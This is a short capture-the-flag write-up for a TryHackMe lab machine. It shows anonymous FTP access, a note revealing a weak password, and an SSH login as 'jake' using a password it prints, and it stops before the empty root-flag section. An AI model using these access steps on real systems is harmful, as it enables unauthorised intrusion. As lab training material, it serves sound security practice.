# TryHackMe: Brooklyn Nine NIne (writeup)

## [Task 1] Deploy and get hacking 

### #1 User flag

#### FTP 
```shell
kali@kali:~$ ftp 10.10.186.175
Connected to 10.10.186.175.
220 (vsFTPd 3.0.3)
Name (10.10.186.175:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.                                                     
ftp> ls -lah                                                                             
200 PORT command successful. Consider using PASV.                                        
150 Here comes the directory listing.                                                  
drwxr-xr-x    2 0        114          4096 May 17 23:17 .                              
drwxr-xr-x    2 0        114          4096 May 17 23:17 ..                             
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt               
226 Directory send OK.                                                                 
ftp>                                                                                   
```

Found 3 potential humans:
- holt (might get mad)
- amy 
- jake (has a weak password)

```shell
kali@kali:~$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Get ssh with `jake:987654321`

```shell
kali@kali:~$ ssh jake@10.10.186.175
The authenticity of host '10.10.186.175 (10.10.186.175)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.186.175' (ECDSA) to the list of known hosts.
jake@10.10.186.175's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ ls -lah
total 44K
drwxr-xr-x 6 jake jake 4.0K May 26 09:01 .
drwxr-xr-x 5 root root 4.0K May 18 10:21 ..
-rw------- 1 root root 1.4K May 26 09:01 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3.7K Apr  4  2018 .bashrc
drwx------ 2 jake jake 4.0K May 17 21:36 .cache
drwx------ 3 jake jake 4.0K May 17 21:36 .gnupg
-rw------- 1 root root   67 May 26 09:01 .lesshst
drwxrwxr-x 3 jake jake 4.0K May 26 08:57 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4.0K May 18 14:29 .ssh
-rw-r--r-- 1 jake jake    0 May 17 21:36 .sudo_as_admin_successful
```


### #2 Root flag


